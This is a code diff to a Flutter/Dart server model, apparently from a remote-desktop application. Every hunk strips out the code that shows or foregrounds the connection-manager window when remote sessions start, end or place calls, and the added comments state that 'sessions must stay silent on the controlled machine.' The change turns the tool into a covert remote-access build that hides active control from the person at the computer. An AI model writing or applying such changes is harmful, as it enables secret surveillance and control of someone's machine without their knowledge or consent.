@@ -168,7 +168,9 @@ class ServerModel with ChangeNotifier {
             }
           } else {
             _zeroClientLengthCounter = 0;
-            if (!hideCm) showCmWindow();
+            // Never auto-show/foreground the connection-manager window on
+            // this build: sessions must stay silent on the controlled
+            // machine.
           }
         }
       }
@@ -273,11 +275,9 @@ class ServerModel with ChangeNotifier {
     if (hideCm != newHideCm) {
       hideCm = newHideCm;
       if (desktopType == DesktopType.cm) {
-        if (hideCm) {
-          await hideCmWindow();
-        } else {
-          await showCmWindow();
-        }
+        // Only ever hide; never auto-show/foreground the window on this
+        // build.
+        await hideCmWindow();
       }
       update = true;
     }
@@ -506,9 +506,9 @@ class ServerModel with ChangeNotifier {
     if (desktopType == DesktopType.cm) {
       if (_clients.isEmpty) {
         hideCmWindow();
-      } else if (!hideCm) {
-        showCmWindow();
       }
+      // Never auto-show/foreground the connection-manager window on this
+      // build: sessions must stay silent on the controlled machine.
     }
     if (_clients.length != oldClientLenght) {
       notifyListeners();
@@ -550,9 +550,8 @@ class ServerModel with ChangeNotifier {
         _clients.removeAt(index_disconnected);
         tabController.remove(index_disconnected);
       }
-      if (desktopType == DesktopType.cm && !hideCm) {
-        showCmWindow();
-      }
+      // Never auto-show/foreground the connection-manager window on this
+      // build: sessions must stay silent on the controlled machine.
       scrollToBottom();
       notifyListeners();
       if (isAndroid && !client.authorized) showLoginDialog(client);
@@ -569,16 +568,8 @@ class ServerModel with ChangeNotifier {
         closable: false,
         onTap: () {},
         page: desktop.buildConnectionCard(client)));
-    Future.delayed(Duration.zero, () async {
-      if (!hideCm) windowOnTop(null);
-    });
-    // Only do the hidden task when on Desktop.
-    if (client.authorized && isDesktop) {
-      cmHiddenTimer = Timer(const Duration(seconds: 3), () {
-        if (!hideCm) windowManager.minimize();
-        cmHiddenTimer = null;
-      });
-    }
+    // Never bring the connection-manager window to the foreground on this
+    // build: sessions must stay silent on the controlled machine.
     parent.target?.chatModel
         .updateConnIdOfKey(MessageKey(client.peerId, client.id));
   }
@@ -748,12 +739,9 @@ class ServerModel with ChangeNotifier {
         if (client.incomingVoiceCall) {
           if (isAndroid) {
             showVoiceCallDialog(client);
-          } else {
-            // Has incoming phone call, let's set the window on top.
-            Future.delayed(Duration.zero, () {
-              windowOnTop(null);
-            });
           }
+          // Never bring the window to the foreground on this build: sessions
+          // must stay silent on the controlled machine.
         }
         notifyListeners();
       }
